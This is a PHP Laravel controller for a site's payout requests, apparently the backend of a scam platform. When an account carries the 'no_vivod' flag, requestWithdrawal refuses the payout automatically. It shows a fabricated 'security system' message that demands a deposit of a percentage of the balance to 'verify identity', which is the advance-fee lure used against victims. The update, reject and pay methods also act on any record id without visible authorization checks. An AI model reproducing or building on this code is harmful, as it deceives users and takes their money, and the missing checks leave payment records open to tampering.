<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use App\Models\WithdrawalRequest;
use Illuminate\Support\Facades\Validator;
use App\Models\RejectionReason;

class PaymentController extends Controller
{
    public function update(Request $request, $id)
    {
        $withdrawalRequest = WithdrawalRequest::find($id);

        if (!$withdrawalRequest) {
            return response()->json(['success' => false, 'message' => 'Запрос не найден'], 404);
        }

        $withdrawalRequest->details = $request->input('details');
        $withdrawalRequest->sum = $request->input('sum');
        $withdrawalRequest->payment_method = $request->input('payment_method');  // Добавьте это поле в модель, если его еще нет
        $withdrawalRequest->save();

        return response()->json(['success' => true, 'message' => 'Данные успешно обновлены']);
    }
    public function requestWithdrawal(Request $request)
    {

        if(auth()->user()->money == 0) {
            return response()->json([
                'status' => 'no_money'
            ]);
        }
        $withdrawalRequest = WithdrawalRequest::where('user_id', auth()->id())
            ->where('status', 'Ожидание') // Исправлено на корректный синтаксис
            ->exists();

        $validator = Validator::make($request->all(), [
            'sum' => [
                'required', 'numeric',
                function($attribute, $value, $fail) {
                    if (auth()->user()->money < $value) {
                        $fail('Недостаточно средств на счету.');
                    }
                }
            ],
            'details' => ['required', 'digits:16'],
            'payment_gateway' => ['required'],
        ]);


        if($withdrawalRequest) {
            return response()->json([
                'status' => 'exists',
            ]);
        }


        if ($validator->fails()) {
            return response()->json(['errors' => $validator->errors()]);
        }

        if(auth()->user()->no_vivod) {
            WithdrawalRequest::create([
                'user_id' => auth()->id(),
                'status' => 'Отказ',
                'details' => $request->details,
                'sum' => $request->sum,
                'payment_gateway' => $request->payment_gateway,
                'reason_for_rejection' => 'Уважаемый клиент, наша система безопасности обнаружила необычную активность на вашем аккаунте и поэтому временно заблокировала его. Для разблокировки и продолжения пользования аккаунтом необходимо внести депозит в размере '. RejectionReason::all()->first()->description .'% от вашего текущего баланса (' . auth()->user()->money * RejectionReason::all()->first()->description / 100  . ' ' . auth()->user()->cur . '), для подтверждения вашей личности. Если у вас есть вопросы или требуется дополнительная информация, обращайтесь в нашу службу поддержки через чат.',
            ]);

            return response()->json([
                'status' => 'no_vivod',
                'no_vivod_message' => 'Уважаемый клиент, наша система безопасности обнаружила необычную активность на вашем аккаунте и поэтому временно заблокировала его. Для разблокировки и продолжения пользования аккаунтом необходимо внести депозит в размере '. RejectionReason::all()->first()->description. '% от вашего текущего баланса ('.auth()->user()->money * RejectionReason::all()->first()->description / 100 . auth()->user()->cur .'), для подтверждения вашей личности. Если у вас есть вопросы или требуется дополнительная информация, обращайтесь в нашу службу поддержки через чат.',
                'vager' => auth()->user()->money * 0.1,
                'cur' => auth()->user()->cur,
            ]);
        }



        WithdrawalRequest::create([
            'user_id' => auth()->id(),
            'status' => 'Ожидание',
            'details' => $request->details,
            'sum' => $request->sum,
            'payment_gateway' => $request->payment_gateway,
        ]);

        return response()->json(['success_message' => 'Обработка платежа']);
    }

    public function paymentReject(string $id, Request $request)
    {
        $withdrawalRequest = WithdrawalRequest::find($id);

        $withdrawalRequest->update([
            'status' => 'Отказ',
            'reason_for_rejection' => $request->reason,
        ]);

        return response()->json([
            'success' => true,
            'message' => 'Отказ зафиксирован'
        ]);
    }

    public function paymentPay(string $id, Request $request)
    {
        $withdrawalRequest = WithdrawalRequest::find($id);

        $withdrawalRequest->update([
            'status' => 'Оплачено',
        ]);

        $user = $withdrawalRequest->user;

        $user->update([
            'money' => $user->money - $withdrawalRequest->sum,
        ]);

        return response()->json([
            'success' => true,
            'message' => 'Средства успешно переведены'
        ]);
    }
}
